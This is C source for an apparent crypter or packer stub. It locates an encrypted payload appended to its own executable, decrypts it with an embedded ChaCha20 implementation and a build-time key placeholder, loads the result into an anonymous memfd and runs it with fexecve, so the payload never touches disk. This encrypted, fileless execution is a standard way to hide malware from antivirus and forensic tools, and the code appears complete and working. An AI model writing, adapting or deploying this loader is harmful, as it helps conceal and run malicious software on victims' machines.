#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <linux/memfd.h>
#include <errno.h>
extern char **environ;

static const unsigned char KEY[32] = {KEYBYTES};

#define ROTL32(v,c) ((v << c) | (v >> (32 - (c))))
#define QR(a,b,c,d) \
  a += b; d ^= a; d = ROTL32(d,16); \
  c += d; b ^= c; b = ROTL32(b,12); \
  a += b; d ^= a; d = ROTL32(d,8);  \
  c += d; b ^= c; b = ROTL32(b,7);

static void chacha_block(uint32_t out[16], const uint32_t in[16]) {
    uint32_t x[16];
    memcpy(x, in, 64);
    for (int i = 0; i < 10; i++) {
        QR(x[0],x[4],x[8],x[12]);  QR(x[1],x[5],x[9],x[13]);
        QR(x[2],x[6],x[10],x[14]); QR(x[3],x[7],x[11],x[15]);
        QR(x[0],x[5],x[10],x[15]); QR(x[1],x[6],x[11],x[12]);
        QR(x[2],x[7],x[8],x[13]);  QR(x[3],x[4],x[9],x[14]);
    }
    for (int i = 0; i < 16; i++) out[i] = x[i] + in[i];
}

static void chacha_crypt(unsigned char *data, size_t len, const unsigned char nonce[12]) {
    uint32_t st[16] = {0x61707865u,0x3320646eu,0x79622d32u,0x6b206574u};
    for (int i = 0; i < 8; i++)
        st[4+i] = (uint32_t)KEY[4*i] | ((uint32_t)KEY[4*i+1]<<8)
                | ((uint32_t)KEY[4*i+2]<<16) | ((uint32_t)KEY[4*i+3]<<24);
    st[13] = (uint32_t)nonce[0] | ((uint32_t)nonce[1]<<8) | ((uint32_t)nonce[2]<<16) | ((uint32_t)nonce[3]<<24);
    st[14] = (uint32_t)nonce[4] | ((uint32_t)nonce[5]<<8) | ((uint32_t)nonce[6]<<16) | ((uint32_t)nonce[7]<<24);
    st[15] = (uint32_t)nonce[8] | ((uint32_t)nonce[9]<<8) | ((uint32_t)nonce[10]<<16) | ((uint32_t)nonce[11]<<24);
    uint32_t blk[16]; unsigned char ks[64]; uint32_t ctr = 1;
    for (size_t off = 0; off < len; off += 64) {
        st[12] = ctr++;
        chacha_block(blk, st);
        for (int i = 0; i < 16; i++) {
            ks[4*i]   = (unsigned char)(blk[i] & 0xff);
            ks[4*i+1] = (unsigned char)((blk[i] >> 8) & 0xff);
            ks[4*i+2] = (unsigned char)((blk[i] >> 16) & 0xff);
            ks[4*i+3] = (unsigned char)((blk[i] >> 24) & 0xff);
        }
        for (int i = 0; i < 64 && off + i < len; i++) data[off+i] ^= ks[i];
    }
}

int main(int argc, char **argv) {
    char self[4096]; ssize_t n = readlink("/proc/self/exe", self, sizeof(self)-1);
    if (n <= 0) return 127;
    self[n] = 0;
    int fd = open(self, O_RDONLY);
    if (fd < 0) return 127;
    off_t sz = lseek(fd, 0, SEEK_END);
    if (sz < 28) return 127;
    unsigned long long t[2]; unsigned char nonce[12];
    lseek(fd, sz - 28, SEEK_SET);
    if (read(fd, t, 16) != 16 || read(fd, nonce, 12) != 12) return 127;
    unsigned long long off = t[0], plen = t[1];
    if (plen == 0 || off + plen > (unsigned long long)sz) return 127;
    unsigned char *buf = malloc(plen);
    if (!buf) return 127;
    lseek(fd, (off_t)off, SEEK_SET);
    size_t got = 0;
    while (got < plen) {
        ssize_t r = read(fd, buf + got, plen - got);
        if (r <= 0) return 127;
        got += (size_t)r;
    }
    close(fd);
    chacha_crypt(buf, plen, nonce);
    int mfd = (int)syscall(SYS_memfd_create, "x", MFD_CLOEXEC);
    if (mfd < 0) return 127;
    if (write(mfd, buf, plen) != (ssize_t)plen) return 127;
    free(buf);
    fexecve(mfd, argv, environ);
    return 127;
}
